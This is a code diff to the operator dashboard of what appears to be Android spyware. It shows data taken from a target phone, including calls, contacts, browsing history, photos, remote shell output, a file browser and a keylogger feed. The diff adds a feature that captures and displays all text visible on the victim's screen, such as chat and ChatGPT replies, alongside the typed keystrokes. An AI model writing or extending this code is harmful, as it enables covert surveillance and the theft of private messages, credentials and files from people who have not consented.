@@ -273,7 +273,7 @@ function initializeDataFeedListeners(uid) {
         f.innerHTML = items.map(c=>{const i=c.state==='ringing'?'🔔':c.state==='offhook'?'📞':'';return `<div class="feed-item live-item">${i} <strong>${esc(c.name||c.number||'Unknown')}</strong> <small>${c.state} • ${fmtTime(c.timestamp)}</small></div>`;}).join('') + f.innerHTML;
     });
 
-    // ── CONTACTS — ALL contacts, grouped by name, sorted A-Z ──
+    // ── CONTACTS ──
     listenToFeed(uid, 'contacts', (d) => {
         const ct = d.contacts||[]; const c = document.getElementById('contacts-count'); if(c) c.textContent = ct.length;
         const f = document.getElementById('contacts-feed'); if(!f) return;
@@ -324,7 +324,7 @@ function initializeDataFeedListeners(uid) {
         f.innerHTML = rows.map(([k,v])=>`<div class="feed-item"><strong>${k}:</strong> ${v||'--'}</div>`).join('');
     });
 
-    // ── KEYLOGGER — App switches + User Input vs Device Output + partial merge ──
+    // ── KEYLOGGER — User input + App switches + Screen content ──
     listenToFeed(uid, 'keylog', (d) => {
         const items = Object.values(d||{}).sort((a,b)=>(b.timestamp||0)-(a.timestamp||0));
         const c = document.getElementById('keylog-count'); if(c) c.textContent = items.length;
@@ -334,7 +334,6 @@ function initializeDataFeedListeners(uid) {
         var systemApps = ['com.samsung.android.biometrics', 'com.android.systemui',
             'com.samsung.android.app', 'com.google.android'];
 
-        // Step 1: Filter and classify
         var grouped = [];
         var prev = null;
         items.forEach(function(k) {
@@ -345,6 +344,7 @@ function initializeDataFeedListeners(uid) {
             if(clean.length === 0) return;
 
             var isAppSwitch = (k.event === 'app_switch');
+            var isScreenContent = (k.event === 'screen_content');
             var isSystem = systemApps.some(function(s){ return app.indexOf(s) === 0; });
 
             if(isAppSwitch) {
@@ -353,23 +353,23 @@ function initializeDataFeedListeners(uid) {
                 return;
             }
 
-            var isDuplicate = prev && !prev.isAppSwitch && prev.app === app && prev.text === text &&
+            var isDuplicate = prev && !prev.isAppSwitch && !prev.isScreenContent && prev.app === app && prev.text === text &&
                               (k.timestamp - prev.timestamp) < 2000;
             if(isDuplicate) return;
 
             grouped.push({app: app, text: text, timestamp: k.timestamp, isSystem: isSystem, event: k.event || 'text_changed'});
-            prev = {app: app, text: text, timestamp: k.timestamp, isAppSwitch: false};
+            prev = {app: app, text: text, timestamp: k.timestamp, isAppSwitch: false, isScreenContent: isScreenContent};
         });
 
-        // Step 2: Merge partial keystrokes (same app, each is prefix of next, within 1.5s)
+        // Merge partial keystrokes (skip app_switch and screen_content)
         var merged = [];
         for(var i = 0; i < grouped.length; i++) {
             var cur = grouped[i];
-            if(cur.event === 'app_switch') { merged.push(cur); continue; }
+            if(cur.event === 'app_switch' || cur.event === 'screen_content') { merged.push(cur); continue; }
             var skip = false;
             if(i + 1 < grouped.length) {
                 var next = grouped[i + 1];
-                if(next.event !== 'app_switch' && next.app === cur.app &&
+                if(next.event !== 'app_switch' && next.event !== 'screen_content' && next.app === cur.app &&
                    next.text.indexOf(cur.text) === 0 && next.text.length > cur.text.length &&
                    (next.timestamp - cur.timestamp) < 1500) {
                     skip = true;
@@ -379,7 +379,7 @@ function initializeDataFeedListeners(uid) {
         }
 
         var display = merged.slice(0, 80);
-        var html = '<div class="feed-item" style="color:#00ff88;font-size:10px;">⌨️ ' + display.length + ' events — <span style="color:#4ecdc4;">⌨️ USER</span> = typed, <span style="color:#ffd93d;">🖥️ DEVICE</span> = screen, <span style="color:#ff6b6b;">📱 APP</span> = switched</div>';
+        var html = '<div class="feed-item" style="color:#00ff88;font-size:10px;">⌨️ ' + display.length + ' events — <span style="color:#4ecdc4;">⌨️ USER</span> typed · <span style="color:#ffd93d;">🖥️ DEVICE</span> screen · <span style="color:#ff6b6b;">📱 APP</span> switch · <span style="color:#a78bfa;">📝 CONTENT</span> full screen</div>';
 
         display.forEach(function(k) {
             var icon, label, color, bgColor, borderColor;
@@ -387,6 +387,9 @@ function initializeDataFeedListeners(uid) {
             if(k.event === 'app_switch') {
                 icon = '📱'; label = 'APP SWITCH'; color = '#ff6b6b';
                 bgColor = 'rgba(255,107,107,0.08)'; borderColor = '#ff6b6b';
+            } else if(k.event === 'screen_content') {
+                icon = '📝'; label = 'SCREEN'; color = '#a78bfa';
+                bgColor = 'rgba(167,139,250,0.08)'; borderColor = '#a78bfa';
             } else if(k.isSystem) {
                 icon = '🖥️'; label = 'DEVICE'; color = '#ffd93d';
                 bgColor = 'rgba(255,217,61,0.05)'; borderColor = '#ffd93d';
@@ -406,6 +409,8 @@ function initializeDataFeedListeners(uid) {
             if(k.event === 'app_switch') {
                 var prevName = k.previous_app ? getFriendlyApp(k.previous_app) : 'Home';
                 html += '<div style="color:#ff6b6b;font-size:11px;">' + esc(prevName) + ' → <strong>' + esc(appName) + '</strong></div>';
+            } else if(k.event === 'screen_content') {
+                html += '<div style="color:#a78bfa;font-size:10px;white-space:pre-wrap;word-break:break-all;max-height:150px;overflow-y:auto;line-height:1.4;">' + esc(k.text) + '</div>';
             } else {
                 html += '<code style="color:#fff;font-size:11px;word-break:break-all;">' + esc(k.text) + '</code>';
             }
@@ -413,6 +418,23 @@ function initializeDataFeedListeners(uid) {
         });
 
         f.innerHTML = html;
+    });
+
+    // ── SCREEN CONTENT — Full visible text (app responses, ChatGPT replies, etc.) ──
+    listenToFeed(uid, 'screen_content', (d) => {
+        if(!d || !d.text) return;
+        var f = document.getElementById('keylog-feed');
+        if(!f) return;
+        var appName = getFriendlyApp(d.app);
+        var triggerLabel = d.trigger === 'app_switch' ? 'App opened' : d.trigger === 'after_input' ? 'After typing' : 'Screen changed';
+        var html = '<div class="feed-item" style="border-left:3px solid #a78bfa;padding-left:8px;background:rgba(167,139,250,0.1);margin-bottom:4px;">';
+        html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">';
+        html += '<span style="color:#a78bfa;font-size:10px;font-weight:bold;">📝 FULL SCREEN — ' + esc(triggerLabel) + '</span>';
+        html += '<span style="color:#555;font-size:9px;">' + esc(appName) + ' • ' + fmtTime(d.timestamp) + '</span>';
+        html += '</div>';
+        html += '<div style="color:#e0d4ff;font-size:10px;white-space:pre-wrap;word-break:break-all;max-height:200px;overflow-y:auto;line-height:1.4;background:rgba(0,0,0,0.3);padding:8px;border-radius:4px;">' + esc(d.text) + '</div>';
+        html += '</div>';
+        f.innerHTML = html + f.innerHTML;
     });
 
     listenToFeed(uid, 'geofence_alerts', (d) => {
@@ -437,7 +459,7 @@ function initializeDataFeedListeners(uid) {
         f.innerHTML = h.slice(0,50).map(h=>`<div class="feed-item"><strong>${esc(h.title||'Untitled')}</strong><br><a href="${h.url}" target="_blank" style="color:#4ecdc4;font-size:11px;">${esc((h.url||'').substring(0,80))}</a> <small>${fmtTime(h.date)}</small></div>`).join('');
     });
 
-    // ── GALLERY WITH REAL IMAGE THUMBNAILS ───────────
+    // ── GALLERY ──
     listenToFeed(uid, 'gallery_list', (d) => {
         const p = d.photos||[]; const f = document.getElementById('gallery-feed'); if(!f) return;
         if(d.status==='loading') {
@@ -463,7 +485,7 @@ function initializeDataFeedListeners(uid) {
         }).join('');
     });
 
-    // ── SHELL OUTPUT (styled terminal) ───────────────
+    // ── SHELL OUTPUT ──
     listenToFeed(uid, 'shell_output', (d) => {
         const o = document.getElementById('shell-output'); if(!o||!d) return;
         o.style.display = 'block';
@@ -480,7 +502,7 @@ function initializeDataFeedListeners(uid) {
         o.scrollTop = o.scrollHeight;
     });
 
-    // ── FILE BROWSER WITH NAVIGATION + IMAGE/VIDEO PREVIEWS ─
+    // ── FILE BROWSER ──
     listenToFeed(uid, 'file_browser', (d) => {
         const o = document.getElementById('file-output'); if(!o||!d) return;
         o.style.display = 'block';
